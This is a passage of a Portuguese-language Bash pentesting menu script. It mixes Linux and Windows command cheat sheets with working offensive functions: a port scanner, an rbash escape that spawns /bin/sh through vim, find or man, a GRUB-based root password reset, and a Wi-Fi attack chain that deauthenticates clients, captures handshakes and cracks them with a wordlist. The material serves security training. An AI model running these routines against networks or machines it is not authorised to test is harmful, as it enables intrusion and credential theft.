    for ((porta=1; porta<1024; porta++)); do
        cat >/dev/null 2>&1 < /dev/tcp/"${host_alvo}"/"${porta}"
        # shellcheck disable=SC2181
        if (($? == 0)); then 
            portas_encontradas+=" $porta"  # Adiciona a porta à lista de portas encontradas
        fi
    done 

    # Imprime a lista de portas encontradas
    echo "Portas abertas em $host_alvo: $portas_encontradas"
    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r 2> /dev/null
    main_menu;
}
# Define a função xii_comandos_uteis_linux para explicar sobre comandos úteis no linux
function xii_comandos_uteis_linux(){
  # limpa a tela
  clear

  # exibe um cabeçalho
  echo
  echo ">>>>>>>>>> COMANDOS LINUX <<<<<<<<<<"
  echo

  # exibe uma seção com comandos para gerenciamento de rede
  echo -e "${RED}# Comandos uteis na gerencia de redes${RESET}"
  echo

  # exibe a sintaxe básica para os comandos
  echo "Sintaxe -> comando (suite)"
  echo

  ### Listar tabela ARP

  # exibe a seção para o comando arp
  echo -e "${RED}## Listar tabela ARP${RESET}"
  echo

  # mostra como usar o comando arp (Net-tools & IP route) para listar a tabela ARP
  echo "arp -a (Net-tools & IP route)"
  echo

  ### Exibir IPs configurados

  # exibe a seção para os comandos ifconfig e ip addr
  echo -e "${RED}## Exibir Ips configurados${RESET}"
  echo

  # mostra como usar o comando ifconfig (Net-tools) para exibir IPs configurados
  echo "ifconfig -a (Net-tools)"

  # mostra como usar o comando ip addr (IP route) para exibir IPs configurados
  echo "ip addr (IP route)"
  echo

  ### Ativar/Desativar uma interface

  # exibe a seção para os comandos ifconfig e ip link
  echo -e "${RED}## Ativar/Desativar uma interface${RESET}"
  echo

  # mostra como usar o comando ifconfig eth0 up/down (Net-tools) para ativar/desativar a interface eth0
  echo "ifconfig eth0 up/down (Net-tools)"

  # mostra como usar o comando ip link set eth0 up/down (IP route) para ativar/desativar a interface eth0
  echo "ip link set eth0 up/down (IP route)"

  # observação sobre a interface eth0
  echo -e "${GRAY}ps: eth0 refere-se a sua interface de rede. Para saber qual as suas interfaces, execute um dos comandos em 'Exibir Ips configurados'${RESET}"
  echo

  ### Exibir conexões ativas

  # exibe a seção para os comandos netstat e ss
  echo -e "${RED}## Exibe conexões ativas${RESET}"
  echo

  # mostra como usar o comando netstat (Net-tools) para exibir conexões ativas
  echo "netstat (Net-tools)"

  # mostra como usar o comando ss (IP route) para exibir conexões ativas
  echo "ss (IP route)"

  # observação sobre o comando ss para detectar shells indesejadas
  echo -e "${GRAY}ps: para (talvez) saber se o chineizinho tem uma shell no seu computador, execute o comando 'ss -lntp'${RESET}"
  echo

  ### Exibir Rotas

  # exibe a seção para os comandos route e ip route
  echo -e "${RED}## Exibe Rotas${RESET}"
  echo

  # mostra como usar o comando route (Net-tools) para exibir rotas
  echo "route (Net-tools)"

  # mostra como usar o comando ip route (IP route) para exibir rotas
  echo "ip route (IP route)"
  echo

  # exibe uma seção com informações sobre configurações de placa de rede
  echo -e "${RED}# Configurações de Placa de Rede${RESET}"
  echo

  ### Configurações de rede em Debian

  # explica como configurar a rede de forma persistente em sistemas derivados do Debian
  echo -e "Nos sistemas derivados do ${RED}Debian${RESET}, a configuração persistente de rede é feita no arquivo ${RED}/etc/network/interfaces${RESET}"
  echo

  ### Configurações de rede em Red Hat Linux

  # explica como configurar a rede de forma persistente em sistemas derivados do Red Hat Linux
  echo -e "Nos sistemas derivados do ${RED}Red Hat Linux${RESET}, a configuração persistente de rede é configurada nos arquivos encontrados no diretório ${RED}/etc/sysconfig/network-scripts${RESET}"
  echo

  # pausa o script até que o usuário pressione ENTER
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  # chama a função main_menu para retornar ao menu principal
  main_menu;
}
# Define a função xiii_exemplos_find para explicar sobre o comando find
function xiii_exemplos_find(){
  # limpa a tela
  clear

  # exibe um cabeçalho
  echo
  echo ">>>>>>>>>> COMANDOS LINUX - FIND & SEUS EXEMPLOS <<<<<<<<<<"
  echo

  ### Listar todos os arquivos em um diretório

  # exibe a descrição e o comando para listar todos os arquivos em um diretório
  echo -e "${RED}# exibe uma lista com todos os arquivos localizados em um determinado diretório, incluindo os arquivos armazenados nos subdiretórios.${RESET}"
  echo -e "$ find ."
  echo

  ### Buscar por arquivos com maxdepth

  # exibe a descrição e o comando para buscar por arquivos com um nível máximo de subdiretórios (maxdepth)
  echo -e "${RED}# Condição que define o nível de 'profundidade' na navegação dos subdiretórios por meio do maxdepth.${RESET}"
  echo -e "$ find /etc -maxdepth 1 -name *.sh"
  echo

  ### Buscar por arquivos com nome específico

  # exibe a descrição e o comando para buscar por arquivos com nome específico usando curingas
  echo -e "${RED}# Pesquisa por arquivos${RESET}"
  echo -e "$ find ./test -type f -name <arquivo*>"
  echo

  ### Buscar por diretórios com nome específico

  # exibe a descrição e o comando para buscar por diretórios com nome específico usando curingas
  echo -e "${RED}# Pesquisa por diretórios${RESET}"
  echo -e "$ find ./test -type d -name <diretorio*>"
  echo

  ### Buscar por arquivos ocultos

  # exibe a descrição e o comando para buscar por arquivos ocultos
  echo -e "${RED}# Pesquisa por arquivos ocultos${RESET}"
  echo -e "$ find ~ -type f -name ".*""
  echo

  ### Buscar por arquivos com permissões específicas

  # exibe a descrição e o comando para buscar por arquivos com permissões específicas
  echo -e "${RED}# Pesquisa por arquivos com determinadas permissões${RESET}"
  echo -e "# find / -type f -perm 0740 -type f -exec ls -la {} 2>/dev/null \;"
  echo
  echo -e "${RED}# Pesquisa por arquivos com permissões SUID${RESET}"
  echo -e "# find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;"
  echo


  ### Buscar por arquivos do usuário específico

  # exibe a descrição e o comando para buscar por arquivos do usuário específico
  echo -e "${RED}# Pesquisa por arquivos do usuário msfadmin${RESET}"
  echo -e "$ find . –user msfadmin"
  echo

  ### Buscar por arquivos do usuário específico com extensão específica

  # exibe a descrição e o comando para buscar por arquivos do usuário específico com extensão específica
  echo -e "${RED}# Pesquisa por arquivos do usuário msfadmin de extensão .txt${RESET}"
  echo -e "$ find . –user msfadmin –name ‘*.txt’"
  echo

  ### Buscar por arquivos do grupo específico

  # exibe a descrição e o comando para buscar por arquivos do grupo específico
  echo -e "${RED}# Pesquisa por arquivos do grupo adm${RESET}"
  echo -e "# find . –group adm"
  echo

  ### Buscar por arquivos modificados há N dias

  # exibe a descrição e o comando para buscar por arquivos modificados há N dias
  echo -e "${RED}# Pesquisa por arquivos modificados a N dias${RESET}"
  echo -e "find / -mtime 5"
  echo

  ### Buscar por arquivos acessados há N dias

  # exibe a descrição e o comando para buscar por arquivos acessados há N dias
  echo -e "${RED}# Pesquisa por arquivos acessados a N dias${RESET}"
  echo -e "# find / -atime 5"
  echo

  ### Buscar e executar comando com arquivos encontrados

  # exibe a descrição e o comando para buscar por arquivos e executar um comando com cada um deles
  echo -e "${RED}# Realiza a busca e executa comando com entradas encontradas.${RESET}"
  echo -e "# find / -name "*.pdf" -type f -exec ls -lah {} \;"
  echo

  # pausa o script até que o usuário pressione ENTER
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  # chama a função main_menu para retornar ao menu principal
  main_menu;
}
# Define a função xiv_debian_memento_troca_senha_root para explicar sobre a troca de senha root no debian
function xiv_debian_memento_troca_senha_root(){
  # limpa a tela
  clear

  # exibe um cabeçalho informativo
  echo
  echo -e "${RED}### Redefinindo a senha de root em sistemas Operacionais Debian e derivados ###${RESET}"
  echo

  ### Passo 1: Reiniciar o computador

  # instrui o usuário a reiniciar o computador alvo
  echo -e " 1. ${RED}Reiniciar o computador alvo;${RESET}"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 2: Editar o menu do GRUB

  # instrui o usuário a entrar no menu de edição do GRUB pressionando a tecla 'e'
  echo -e " 2. Editar o menu do grub pressionando a tecla ${RED}'e'${RESET};"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 3: Localizar e modificar a linha de comando

  # instrui o usuário a localizar a linha que inicia com "linux boot..." e substituir "ro quiet" por "init=/bin/bash rw"
  echo -e " 3. Procurar pela linha que inicia com ${RED}'linux boot…${RESET}', substituir ${RED}'ro quiet${RESET}' ao final dessa linha por ${RED}'init=/bin/bash rw'${RESET};"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 4: Salvar as alterações e inicializar o sistema

  # instrui o usuário a salvar as alterações pressionando "Ctrl+x" e inicializar o sistema com os novos parâmetros
  echo -e " 4. Pressione ${RED}'Ctrl+x'${RESET} para iniciar o sistema com os parâmetros alterados;"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 5: Definir a nova senha de root

  # instrui o usuário a definir a nova senha de root após o sistema inicializar
  echo -e " 5. Após a inicialização do sistema, execute ${RED}'passwd root'${RESET} e digite a nova senha."

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 6: Reinicializar o sistema

  # instrui o usuário a reinicializar o sistema após definir a nova senha
  echo -e " 6. Reinicialize o SO, utilize o comando: ${RED}'reboot -f'${RESET}"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Mensagem de confirmação

  # exibe uma mensagem informando que a senha do root foi redefinida
  echo
  echo -e "${RED}### NESSE MOMENTO, SE DEU TUDO CERTO, VOCÊ POSSUI A SENHA DO ROOT USER ###${RESET}"
  echo

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  # volta para o menu principal
  main_menu;
}
# Define a função xiv_debian_memento_troca_senha_root para explicar sobre a troca de senha root no redhat
function xv_redhat_memento_troca_senha_root(){ #!FIXME
  # limpa a tela
  clear

  # exibe um cabeçalho informativo
  echo
  echo -e "${RED}### Redefinindo a senha de root em sistemas Operacionais Red Hat e derivados ###${RESET}"
  echo

  ### Passo 1: Reiniciar o computador

  # instrui o usuário a reiniciar o computador alvo
  echo -e " 1. ${RED}Reiniciar o computador alvo${RESET}"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 2: Editar o menu do GRUB

  # instrui o usuário a entrar no menu de edição do GRUB pressionando a tecla 'e'
  echo -e " 2. Editar o menu do grub pressionando a tecla ${RED}'e'${RESET};"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 3: Localizar e modificar a linha de comando no CentOS/Fedora

  # instrui o usuário a localizar a linha que inicia com "linux16..." e substituir "rghb quiet LANG=en_US.UTF-8" por "init=/bin/bash rw" (para CentOS/Fedora)
  echo -e " 3. Procurar pela linha que inicia com ${RED}'linux16...'${RESET}, substituir ${RED}'rghb quiet LANG=en_US.UTF-8${RESET} ao final dessa linha por ${RED}'init=/bin/bash rw'${RESET};"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 4: Salvar as alterações e inicializar o sistema

  # instrui o usuário a salvar as alterações pressionando "Ctrl+x" e inicializar o sistema com os novos parâmetros
  echo -e " 4. Pressione ${RED}'Ctrl\+x'${RESET} para iniciar o sistema com os parâmetros alterados;"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 5: Desabilitar o SELinux (somente CentOS/Fedora)

  # informa ao usuário que o SELinux precisa ser desabilitado (apenas para CentOS/Fedora)
  echo -e " 5. Após a inicialização do sistema, temos que desabilitar o SELinux. Para isso, edite o arquivo ${RED}'/etc/selinux/config'${RESET} e substitua a opção ${RED}'enforcing'${RESET} por ${RED}'disable'${RESET};"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 6: Reinicializar o sistema (somente CentOS/Fedora)

  # instrui o usuário a reinicializar o sistema após desabilitar o SELinux (apenas para CentOS/Fedora)
  echo -e " 6. Reinicialize o SO, utilize o comando: ${RED}'/sbin/halt –reboot \-f'${RESET}"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 7: Editar o menu do GRUB novamente (somente Rocky/Alma)

  # informa ao usuário que o menu do GRUB precisa ser editado novamente (apenas para Rocky/Alma)
  echo -e " 7. Editar o menu do grub pressionando a tecla ${RED}'e'${RESET};"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 8: Localizar e modificar a linha de comando no Rocky/Alma

  # instrui o usuário a localizar a linha que inicia com "linux16..." e substituir "rghb quiet LANG=en
}
# Definição da função xvi_vim_memento
function xvi_vim_memento(){
  # Limpa a tela
  clear

  # Exibe cabeçalho do lembrete de uso do Vim
  echo -e "${GREEN}============= LEMBRETE DE USO DO VIM =============${RESET}"
  echo

  # **Inserção de texto**
  echo -e "${YELLOW}Inserção de texto:${RESET}"
  echo -e "Pressione 'i' para entrar no modo de inserção."

  # **Salvar e sair**
  echo -e "\n${YELLOW}Salvar e sair:${RESET}"
  echo -e "Pressione 'Esc' para sair do modo de inserção, então digite ':wq' para salvar e sair."

  # **Sair sem salvar**
  echo -e "\n${YELLOW}Sair sem salvar:${RESET}"
  echo -e "Pressione 'Esc' para sair do modo de inserção, então digite ':q!' para sair sem salvar."

  # **Movimentação pelo texto**
  echo -e "\n${YELLOW}Movimentação pelo texto:${RESET}"
  echo -e "Use as teclas de seta ou as teclas 'h', 'j', 'k' e 'l' para mover o cursor."

  # **Excluir texto**
  echo -e "\n${YELLOW}Excluir texto:${RESET}"
  echo -e "Pressione 'x' para excluir o caractere sob o cursor."

  # **Desfazer e refazer**
  echo -e "\n${YELLOW}Desfazer e Refazer:${RESET}"
  echo -e "Pressione 'u' para desfazer e 'Ctrl + r' para refazer."

  # **Buscar e substituir**
  echo -e "\n${YELLOW}Buscar e Substituir:${RESET}"
  echo -e "Digite '/' para iniciar a busca. Para substituir, use ':s/palavra/nova_palavra/g'."

  # **Ajuda**
  echo -e "\n${YELLOW}Ajuda:${RESET}"
  echo -e "Digite ':help' para obter ajuda."

  # Exibe rodapé do lembrete de uso do Vim
  echo -e "\n${GREEN}===================================================${RESET}"
  echo

  # Mensagem para pressionar ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  # Chamada da função principal do menu principal após pressionar ENTER
  main_menu;
}
# Definição da função principal xvii_tec_esc_rbash
function xvii_tec_esc_rbash(){

    # Definição da função vim_escape_rbash
    function vim_escape_rbash(){
        # Comando do Vim para escapar do rbash
        local vim_comando="vim.tiny -E -c :\!/bin/sh"

        # Verificar se o konsole está instalado
        if command -v konsole &> /dev/null; then
                # KDE (Konsole)
                konsole --hold -e "${vim_comando}"
        else
            # Tilix não está instalado, verificar a distribuição Linux e abrir um terminal padrão
            if command -v gnome-terminal &> /dev/null; then
                # Ubuntu (Gnome Terminal)
                gnome-terminal -- "${vim_comando}"
            elif command -v xfce4-terminal &> /dev/null; then
                # Xubuntu (Xfce Terminal)
                xfce4-terminal --execute "${vim_comando}"
            elif command -v tilix &> /dev/null; then
                # Tilix está instalado
                tilix --action=app-new-window "${vim_comando}"
            elif command -v xterm &> /dev/null; then
                # Terminal genérico (xterm)
                xterm -e "${vim_comando}"
            else
                # Nenhum terminal padrão encontrado
                echo "Nenhum terminal padrão encontrado. Este script não pode escapar do rbash."
                exit 1
            fi
        fi
    }

    # Definição da função find_escape_rbash
    function find_escape_rbash(){
        # Comando find para escapar do rbash
        local find_comando="find . -exec /bin/sh \; -quit"

        # Verificar se o Tilix está instalado
        if command -v tilix &> /dev/null; then
            # Tilix está instalado, abrir uma nova sessão do Tilix
            tilix --action=app-new-window "${find_comando}"
        else
            # Tilix não está instalado, verificar a distribuição Linux e abrir um terminal padrão
            if command -v gnome-terminal &> /dev/null; then
                # Ubuntu (Gnome Terminal)
                gnome-terminal -- "${find_comando}"
            elif command -v xfce4-terminal &> /dev/null; then
                # Xubuntu (Xfce Terminal)
                xfce4-terminal --execute "${find_comando}"
            elif command -v konsole &> /dev/null; then
                # KDE (Konsole)
                konsole --hold -e "${find_comando}"
            elif command -v xterm &> /dev/null; then
                # Terminal genérico (xterm)
                xterm -e "${find_comando}"
            else
                # Nenhum terminal padrão encontrado
                echo "Nenhum terminal padrão encontrado. Este script não pode escapar do rbash."
                exit 1
            fi
        fi
    }

    # Definição da função man_escape_rbash
    function man_escape_rbash(){
        # Comando man para escapar do rbash
        local man_comando="echo 'Para escapar do rbash, logo apos o man iniciar, digite \!sh. Para continuar, aperte enter' && read && man man"

        # Verificar se o Tilix está instalado
        if command -v tilix &> /dev/null; then
            # Tilix está instalado, abrir uma nova sessão do Tilix
            tilix --action=app-new-window "${man_comando}"
        else
            # Tilix não está instalado, verificar a distribuição Linux e abrir um terminal padrão
            if command -v gnome-terminal &> /dev/null; then
                # Ubuntu (Gnome Terminal)
                gnome-terminal -- "${man_comando}"
            elif command -v xfce4-terminal &> /dev/null; then
                # Xubuntu (Xfce Terminal)
                xfce4-terminal --execute "${man_comando}"
            elif command -v konsole &> /dev/null; then
                # KDE (Konsole)
                konsole --hold -e "${man_comando}"
            elif command -v xterm &> /dev/null; then
                # Terminal genérico (xterm)
                xterm -e "${man_comando}"
            else
                # Nenhum terminal padrão encontrado
                echo "Nenhum terminal padrão encontrado. Este script não pode escapar do rbash."
                exit 1
            fi
        fi
    }

    # Definição da função verifica_comandos_instalados
    function verifica_comandos_instalados () {
        # Verificar se o Vim está instalado e acessível
        if command -v vim &> /dev/null; then
            # Executar função para escapar do rbash com Vim
            vim_escape_rbash;
        else
            # Verificar se o Find está instalado e acessível
            if command -v find &> /dev/null; then
                # Executar função para escapar do rbash com Find
                find_escape_rbash;
            # Verificar se o Man está instalado e acessível
            elif command -v man &> /dev/null; then
                # Executar função para escapar do rbash com Man
                man_escape_rbash;
            else
                # Nenhum dos comandos necessários está instalado
                echo "O script não é capaz de sair do rbash"    
            fi
        fi   
    }

    # Definição da função principal main_tec_esc_rbash
    function main_tec_esc_rbash(){
        # Chamar função para verificar comandos instalados e escapar do rbash
        verifica_comandos_instalados;
        pausa_script;
    }

    # Chamar função principal
    main_tec_esc_rbash

}
# Este script realiza testes de penetração em redes wireless
function xviii_wifi_atk(){
    ##############################################################
    #
    #           Wireless Pentest 
    #
    #           AUTOR: Z1GSN1FF3R||R3v4N||0wL 
    #
    #           DATA: 01-27-2021
    #           REFATORADO: 04-22-2024    
    #   
    #           DESCRIÇÃO: Este script realiza testes de penetração em redes wireless.
    #
    #
    ##############################################################
     
    # Função para executar configurações preliminares antes do ataque
    function pre_configuracoes(){
        # **Descrição:** Desliga a interface 'mon0' do modo monitor.

        airmon-ng stop mon0

        # **Explicação:**

        # O comando `airmon-ng stop mon0` desativa a interface 'mon0' do modo monitor. 
        # Isso é necessário para que a interface possa ser usada para outras finalidades, como se conectar a uma rede Wi-Fi.
        # É importante notar que este comando pode falhar se a interface 'mon0' não estiver ativa no modo monitor.

        # **Observações:**

        # Certifique-se de que a interface 'mon0' esteja ativa no modo monitor antes de executar este comando.
        # Se o comando falhar, tente verificar o status da interface com o comando `airmon-ng check`.
    }

    # Função para mostrar as interfaces wireless disponíveis e configurar a interface para o modo monitor
    function interfaces_disponiveis(){
        clear
        #if #TODO: ADC UMA CHECAGEM IF AQUI PARA VERIFICAR A INTERFACE WIFI
        #echo ""
        #echo "=========== IW DISPONIVEIS ============="
        #airmon-ng
        #echo "=========== MONITOR MODE ============="
        #read -p "Interface Wireless para entrar em modo monitor: " INTERFACE
        #echo "======================================"
        #echo ""
    }        

    # Função para realizar as configurações iniciais, como desativar a interface, configurar o modo monitor e alterar o endereço MAC
    function configuracoes_iniciais(){
        # Desativa a interface de rede
        ifconfig "${INTERFACE}" down

        # Adiciona uma nova interface em modo monitor chamada mon0
        iw dev "${INTERFACE}" interface add mon0 type monitor

        # Altera o endereço MAC da interface mon0
        macchanger -r mon0

        # Verifica se há processos em execução que podem interferir e os encerra
        airmon-ng check kill #kill the process that maybe cause some problem

        # Solicita ao usuário para pressionar ENTER para continuar
        echo -e "${GRAY} Pressione ENTER para continuar${RESET}" && read -r 2> /dev/null
    }

    # Função para iniciar o monitoramento em modo promíscuo
    function monitoramento_promiscuo(){
        # Obtém o timestamp atual para nomear o arquivo de log
        local timestamp
        timestamp=$(date +"%d%H%M%b%y")    

        # Executa o comando airodump-ng para iniciar o monitoramento em modo promíscuo e escrever os resultados em um arquivo de log com o timestamp no nome
        airodump-ng mon0 --write monitoramento_promiscuo_log"$timestamp"
    }

    # Função para escanear o Access Point (AP) alvo e escrever os resultados em um arquivo de log
    function scan_ap_alvo(){    
        echo "" # Imprime uma linha em branco para melhorar a apresentação no terminal
        echo "============================================"

        # Solicita ao usuário o BSSID (MAC do AP) do alvo
        read -r -p "BSSID (MAC do AP) do alvo: " MACTARGET

        # Solicita ao usuário o canal do AP
        read -r -p "Canal do AP: " CHANNEL #TODO: ADC TRATAMENTO PARA FILTRAR O CANAL DO AP LOGO APÓS A INSERÇÃO DO BSSID

        echo "============================================"
        echo "" # Imprime uma linha em branco para melhorar a apresentação no terminal

        # Executa o comando airodump-ng para escanear o AP alvo, utilizando o BSSID e o canal fornecidos pelo usuário, e escreve os resultados em um arquivo de log
        airodump-ng mon0 --bssid "$MACTARGET" -c "$CHANNEL" --write scan_ap_alvo_log
    }

    # Função para capturar o handshake de autenticação entre o cliente e o AP alvo
    function captura_4whsk(){
        # Abre uma nova sessão do Tilix e executa o comando airodump-ng para capturar o handshake de autenticação entre o cliente e o AP alvo.
        # Os resultados são escritos em um arquivo de log chamado captura_4whsk_log.
        # O redirecionamento "> /dev/null 2>&1" é utilizado para suprimir a saída padrão e de erro do comando, e o processo é executado em segundo plano "&".
        tilix --action=app-new-window -e airodump-ng mon0 --bssid "$MACTARGET" -c "$CHANNEL" --write captura_4whsk_log > /dev/null 2>&1 &
    }

    # Função para realizar um ataque de desautenticação (deauth) no cliente especificado
    function ataque_deauth(){  
        echo ""
        echo "============================================"
        read -r -p "MAC do cliente para ser desconectado: " CLNTMAC
        echo "============================================"
        echo ""
        # Deauth no cliente
        for ((i=1;i<=3;i++)); do
            # Executa o comando aireplay-ng para realizar o ataque de desautenticação.
            # A opção "--deauth=5" indica o número de pacotes de desautenticação a serem enviados.
            # Os parâmetros "-a" e "-c" especificam o endereço MAC do AP alvo e do cliente, respectivamente.
            # A saída do comando é salva em um arquivo de log chamado ataque_deauth.log, utilizando o comando "tee -a".
            aireplay-ng --deauth=5 -a "$MACTARGET" -c "$CLNTMAC" mon0 | tee -a ataque_deauth.log
            # Mensagem para informar o intervalo entre os ataques de desautenticação
            echo "Intervalo de 5s entre um ataque e outro de Deauth. Aperte Ctrl+C para cancelar após a captura do 4-way-handshake"
            if [ $i -lt 3 ]; then #TODO:VERIFICAR NECESSIDADE DESSE IF
                sleep 5
            fi
        done
    }

    # Função para quebrar a senha usando um dicionário de palavras
    function quebra_senha_dicionario(){
        aircrack-ng captura_4whsk_log*.cap -w /usr/share/wordlists/rockyou.txt
    }

    # Função principal para executar todas as etapas do ataque
    function main_wifi_atk(){
        # Executa as configurações pré-ataque
        pre_configuracoes;
        # Verifica as interfaces disponíveis
        interfaces_disponiveis;
        # Realiza as configurações iniciais, como desativar a interface, configurar o modo monitor e alterar o endereço MAC
        configuracoes_iniciais;
        # Inicia o monitoramento em modo promíscuo
        monitoramento_promiscuo;
        # Escaneia o AP alvo e grava os resultados em um arquivo de log
        scan_ap_alvo;
        # Captura o handshake de autenticação entre o cliente e o AP alvo
        captura_4whsk;
        # Realiza um ataque de desautenticação no cliente especificado
        ataque_deauth;
        # Tenta quebrar a senha utilizando um dicionário
        quebra_senha_dicionario;
        # Mensagem para pressionar ENTER para continuar
        echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
        read -r 2> /dev/null
        # Chamada da função principal do menu principal após pressionar ENTER
        main_menu;  
    }

    # Chama a função principal
    main_wifi_atk;

}
#
function xix_cmd_basicos_windows(){
    clear
    echo -e ""
    function comandos_basicos() {
        echo -e "${WHITE}############################## COMANDOS BÁSICOS ##############################${RESET}"
        echo -e "${RED}help ${GRAY}# Mostra os comandos disponíveis.${RESET}"
        echo -e "${RED}help <comando> OR <comando> /? ${GRAY}# Mostra a ajuda para utilizar determinado comando.${RESET}"
        echo -e ""
        echo -e "${RED}cls ${GRAY}# Serve para limpar a tela do terminal em uso${RESET}"
    }
    function dir_cmd(){
        echo -e "${WHITE}################### DIR #######################${RESET}"
        echo -e "${RED}dir ${GRAY}# Serve para listar os arquivos presentes no diretório atual.${RESET}"
        echo -e "${RED}dir /a ${GRAY}# Lista inclusive arquivos ocultos${RESET}"
        echo -e ""
    }
    function gamb_dir2find(){
        echo -e "${WHITE}############### GAMBIARRA SEMELHANTE AO FIND #################${RESET}"
        echo -e "${RED}dir /s /a /b *pass* == *cred* == *vnc* == *unatt* == *.config* ${GRAY}# Busca por arquivos que contenham o nome especificado, a partir do diretório atual. (observação: '==' é equivalente a 'or')${RESET}"
        echo -e ""
    }
    function cd_cmd(){
        echo -e "${WHITE}################### CD #######################${RESET}"
        echo -e "${RED}cd <diretorio> ${GRAY}# Serve para navegar entre os diretórios do Windows.${RESET}"
        echo -e "${RED}cd .. ${GRAY}# Navegar para um diretório acima do diretório atual${RESET}"
        echo -e "${RED}cd ${GRAY}# Mostra qual o diretório atual (semelhante ao \"pwd\" do linux)${RESET}"
        echo -e ""
        echo -e "${RED}md ${GRAY}# Serve para criar um novo diretório.${RESET}"
        echo -e ""
    }
    function rd_cmd(){
        echo -e "${WHITE}################### RD #######################${RESET}"
        echo -e "${RED}rd ${GRAY}# Serve para deletar um diretório.${RESET}"
        echo -e "${RED}rd /s ${GRAY}# modo recursivo${RESET}"
        echo -e "${RED}rd /q ${GRAY}# (quiet, sem pedir confirmação)${RESET}"
        echo -e ""
        echo -e "${RED}type ${GRAY}# Exibe o conteúdo, em formato de texto, de um arquivo.${RESET}"
        echo -e ""
        echo -e "${RED}ren <nome_antigo> <nome_novo> ${GRAY}# Renomear determinado arquivo ou diretório.${RESET}"
        echo -e ""
    }
    function xcopy_cmd(){
        echo -e "${WHITE}################### XCOPY #######################${RESET}"
        echo -e "${RED}xcopy <arquivo_original> <nome_da_copia> ${GRAY}# Faz a cópia de arquivos/diretórios. Porém não copia os subdiretórios.${RESET}"
        echo -e ""
        echo -e "${RED}xcopy /e <original> <copia> ${GRAY}# Copia inclusive subdiretórios.${RESET}"
        echo -e "${RED}xcopy /s <original> <copia> ${GRAY}# Copia inclusive subdiretórios, exceto os subdiretórios vazios.${RESET}"
        echo -e ""
        echo -e ""
        echo -e "${RED}del ${GRAY}# Deleta um arquivo e/ou diretório${RESET}"
        echo -e ""
        echo -e ""
        echo -e "${RED}move <origem> <destino> ${GRAY}# Move um arquivo/diretório de um local para outro.${RESET}"
        echo -e ""
    }
    function whoami_cmd(){
        echo -e "${WHITE}################### WHOAMI #######################${RESET}"
        echo -e "${RED}whoami ${GRAY}# Mostra o nome de usuário e domínio atual.${RESET}"
        echo -e "${RED}whoami /priv ${GRAY}# Mostra os privilégio do usuário.${RESET}"
        echo -e ""
    }
    function tree_cmd(){
        echo -e "${WHITE}################### TREE #######################${RESET}"
        echo -e "${RED}tree ${GRAY}# Lista o diretório atual e todos os seus subdiretórios.${RESET}"
        echo -e "${RED}tree <diretorio> ${GRAY}# Lista o diretório informado e todos os seus subdiretórios${RESET}"
        echo -e "${RED}tree /f ${GRAY}# Lista o diretório atual, assim como todos os seus subdiretórios e arquivos.${RESET}"
        echo -e ""
    }
    function shutdown_cmd(){
        echo -e "${WHITE}################### SHUTDOWN #######################${RESET}"
        echo -e "${RED}shutdown ${GRAY}# Desligar/ reiniciar o sistema.${RESET}"
        echo -e "${RED}shutdown /s ${GRAY}# Desligar${RESET}"
        echo -e "${RED}shutdown /l ${GRAY}# fazer logoff${RESET}"
        echo -e "${RED}shutdown /r ${GRAY}# reiniciar${RESET}"
        echo -e "${RED}shutdown /f ${GRAY}# executar shutdown sem avisar o usuário (Força fechamento dos programas em execução)${RESET}"
        echo -e "${RED}shutdown /c \"comentario\" ${GRAY}# aparece um aviso para o usuário antes de fazer o desligamento.${RESET}"
        echo -e ""
    }
    function outros(){
        echo -e "${WHITE}################### OUTROS #######################${RESET}"
        echo -e "${RED}> ${GRAY}# Direciona a saída de um comando para um arquivo (substituindo o conteúdo do arquivo).${RESET}"
        echo -e "${RED}>> ${GRAY}# Direciona a saída de um comando para o conteúdo de um arquivo (Adiciona o conteúdo do arquivo).${RESET}"
        echo -e ""
        echo -e "${RED}sort arquivo.txt ${GRAY}# Exibe o conteúdo do arquivo especificado, na ordem alfabética (Apenas exibe, não modifica o conteúdo do arquivo).${RESET}"
        echo -e "${RED}sort /r arquivo.tx ${GRAY}# Exibe o conteúdo do arquivo especificado, de maneira inversa à ordem alfabética (Apenas exibe, não modifica o conteúdo do arquivo).${RESET}"
        echo -e ""
